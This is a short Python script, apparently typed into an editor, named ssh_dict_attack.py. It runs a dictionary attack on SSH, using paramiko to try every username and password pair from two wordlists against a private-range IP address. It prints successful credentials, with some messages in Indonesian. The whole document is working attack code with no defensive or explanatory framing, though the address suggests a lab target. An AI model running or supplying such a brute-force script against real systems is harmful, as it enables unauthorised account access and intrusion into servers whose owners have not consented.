#nano ssh_dict_attack.py
import paramiko
import time

target_ip = "192.168.184.112"
port = 22

def read_list(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines()]

usernames = read_list("userlist.txt")
passwords = read_list("passlist.txt")

def attempt_login(username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, port=port, username=username, password=password, timeout=5)
        print(f"[✅ SUCCESS] Login berhasil → {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[❌ FAILED] {username}:{password}")
    except Exception as e:
        print(f"[⚠️ ERROR] {e}")
    finally:
        ssh.close()
    return False

for user in usernames:
    for pwd in passwords:
        if attempt_login(user, pwd):
            exit(0)
        time.sleep(0.5)
